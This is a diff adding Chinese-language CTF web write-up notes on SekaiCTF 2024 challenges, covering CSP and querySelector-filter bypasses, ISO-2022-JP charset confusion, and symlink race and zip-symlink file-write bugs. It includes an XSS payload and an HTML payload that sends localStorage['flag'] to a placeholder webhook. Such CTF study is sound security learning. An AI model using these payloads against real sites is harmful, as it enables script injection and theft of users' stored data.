@@ -218,6 +218,31 @@
     - 另一种绕过方式和更详细的wp： https://hxuu.github.io/blog/ctf/idek24/hello/ 。[hacktricks](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm)有记录
 - [Tagless](https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless)
     - 对自己无语了，明明都找到关键点了还能死在最后一步……真的我这个脑子别打CTF了，干脆专职写这个repo得了（不打CTF的CTFer...）。总之这题的关键点是，题目提供了一个复述输入内容的页面，没有限制内容的格式，所以可以注入html。不能输入`<...>`，但是可以用url二次编码绕过。这点我看到了。但是csp设定了`script-src 'self'`，导致不能用inline script，只能从当前host导入js。不过网页还提供了一个功能：若当前url为404，就在网页上打出这个url。啊看到这个加上之前看过的[Noscript](https://octo-kumo.github.io/c/ctf/2024-wanictf/web/noscript)题，我就感觉可以利用一下。结果被那题带偏了，一直在想怎么用`<object>`标签导入，而且`<>`的过滤总是处理不好。用了url二次编码看起来行了，但是payload还是解析失败。看了wp才发现是js代码语法的问题，要这么搞：`<script src="/**/alert(document.domain)//"></script>`，加几个注释规避掉报错
+- [htmlsandbox](https://blog.bawolff.net/2024/09/sekaictf-2024-htmlsandbox.html)
+    - 如何绕过`document.querySelector('script, noscript, frame, iframe, object, embed') === null`检查：可以用`<template>`标签包住要隐藏的tag：`<template shadowrootmode="closed"><script>....</script></template>`
+    - csp meta标签的限制：
+        - 必须在`<head>`标签中，若在`<body>`中会被忽略
+        - 无法作用于所有在meta标签前的内容（就是定义出来后csp只作用于下面的内容，当前meta标签前定义的东西一律不管）
+    - 在HTML5规定中，无法在`<head>`标签前添加任何东西。这么做相当于默认关闭了`<head>`标签并开启`<body>`标签。注释，DTD除外
+    - dom clobbering无法绕过`document.querySelector()`配合`===`的过滤
+    - chrome禁用了`data:`url的meta标签的重定向
+    - 根据html5规定的13.2部分： https://html.spec.whatwg.org/multipage/parsing.html#parsing ，在浏览器决定当前文档的编码格式时，若当前文档的所有内容尚未加载完毕，可以只将编码格式作用于已加载好的第一部分。对于`data:` url，编码格式作用于整个文档（因为这样的文档是一瞬间加载好的）；但对于网络加载的url则不是这样。non-streamed html和streaming html的差别
+    - ISO-2022-JP Charset confusion（[forms](https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/blob/main/Web/forms)也是这个知识点）。配合上一条就可以在这题构造出编码格式的差异：
+    ```html
+    <html>
+	<head>
+    	<!-- é - Add a windows-1252 character to make sure early heurstics detect as windows-1252 -->
+        <!-- ^[$BNq From this part onwards it is visible only in windows-1252 mode -->
+        <script> doSomeEvilStuff();x = new Image(); x.src='https://mywebhook?' + encodeURIComponent(localStorage['flag']); </script>
+        <!-- Bunch of junk. Repeat this 3000 times to split amongst multiple packets -->
+        <!-- ^[(B After this point, visible in both modes -->
+        <meta http-equiv="Content-Security-Policy" content="default-src 'none'">
+        <meta charset="iso-2022-jp">
+    </head>
+    <body></body></html>
+    ```
+    假如用`data:` url加载这段内容，整个文档瞬间加载完成，浏览器直接用meta标签里定义的`iso-2022-jp`作为编码格式，那么上面那段`<script>`就会被吞掉；但是若用网络加载，我们在中间填充的垃圾内容会增加文档加载的时间，浏览器只能先加载前面的部分，`<script>`内容正常渲染。过了一段时间后才能加载到meta部分，这时才把编码格式换成`iso-2022-jp`，但不会影响之前已经渲染的内容。本来在遇到延迟的meta标签后，浏览器应该重新解析整个文档，但chrome没有，造成了这个差异漏洞
+    - 更详细的wp： https://0xalessandro.github.io/posts/sekai
 
 ## SSTI
 
@@ -3931,3 +3956,6 @@ new URL("//a.com","http://b.com")
 - 此题涉及到c++应用框架Juce和c++网站框架Drogon。第一次见c++网站
 - 漏洞在于juce 6.1.4的zip symlink攻击。有了这个漏洞，攻击者就可以在juce解压zip文件时在服务器上写入任意文件
 - Drogon危险配置项`load_dynamic_views`会自动加载`.csp`文件。[官方文档](https://github.com/drogonframework/drogon/wiki/ENG-06-View#dynamic-compilation-and-loading-of-views)建议仅在开发环境下使用该配置项，否则攻击者可以在服务器上写入Drogon的`.csp`文件从而执行任意代码
+490. [funny-lfr](https://blog.neilhommes.xyz/docs/Writeups/2024/sekaictf.html)
+- python [Starlette](https://www.starlette.io/) （网站框架）中出现的条件竞争。根据源码，这个框架内部用`os.stat`函数决定要下载的文件的大小，太大或者等于零都无成功下载文件。后一种情况导致我们无法读取`/proc/self`下的文件，因为整个`/proc`目录都在[procfs](https://en.wikipedia.org/wiki/Procfs)文件系统下，而这个系统又是一个不包含任何实际文件的虚拟文件系统。然而攻击者可以创建一个指向别的文件的symlink，然后让服务器下载这个symlink，同时中途将symlink指向的文件换成`/proc`下的文件
+- 这个解法不是预期解，因为需要用ssh连到题目的环境。预期解则不需要： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#funny-lfr
